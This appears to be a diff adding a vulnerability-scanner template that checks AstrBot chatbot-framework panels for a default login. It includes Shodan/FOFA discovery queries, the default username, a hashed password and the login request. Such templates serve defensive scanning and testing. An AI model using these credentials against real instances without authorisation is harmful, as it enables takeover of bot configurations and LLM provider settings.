@@ -1,0 +1,60 @@
+id: astrbot-default-login
+info:
+  name: AstrBot 默认凭据登录漏洞
+  author: theamanrawat
+  severity: high
+  description: AstrBot 存在默认登录漏洞。攻击者可使用默认凭据访问 AstrBot 控制面板，从而获取聊天机器人框架的控制权，修改配置、管理
+    LLM 提供商并执行未授权操作。
+  reference:
+  - https://github.com/Soulter/AstrBot
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+    cvss-score: 8.3
+    cwe-id:
+    - CWE-798
+  metadata:
+    verified: true
+    max-request: 2
+    vendor: soulter
+    product: astrbot
+    shodan-query: html:"<title>AstrBot"
+    fofa-query: body="<title>AstrBot"
+  tags: astrbot
+flow: http(1) && http(2)
+http:
+- method: GET
+  path:
+  - '{{BaseURL}}/'
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - <title>AstrBot
+    internal: true
+  - type: status
+    status:
+    - 200
+    internal: true
+- raw:
+  - |
+    POST /api/auth/login HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/json
+
+    {"username":"{{username}}","password":"{{password}}"}
+  attack: pitchfork
+  payloads:
+    username:
+    - astrbot
+    password:
+    - 77b90590a8945a7d36c963981a307dc9
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '"token"'
+  - type: status
+    status:
+    - 200
